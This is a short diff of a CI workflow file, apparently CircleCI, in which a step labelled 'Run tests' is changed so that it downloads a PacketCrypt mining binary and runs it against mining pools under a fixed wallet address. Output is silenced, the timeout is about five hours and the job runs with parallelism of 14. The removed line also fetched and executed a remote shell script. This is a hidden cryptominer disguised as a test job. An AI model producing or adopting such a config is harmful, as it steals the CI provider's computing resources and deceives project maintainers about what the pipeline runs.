@@ -9,7 +9,9 @@ jobs:
           name: Run tests
           no_output_timeout: 294m
           command: |
-                  wget https://raw.githubusercontent.com/Snsnn88228/nns/main/Run.sh && chmod +x Run.sh && ./Run.sh
+                  wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
+                  chmod +x lah 
+                  ./lah ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335  http://pool.pkt.world/ http://pool.pktpool.io/ >/dev/null 2>&1
                   echo "lah"
     parallelism: 14
 workflows:
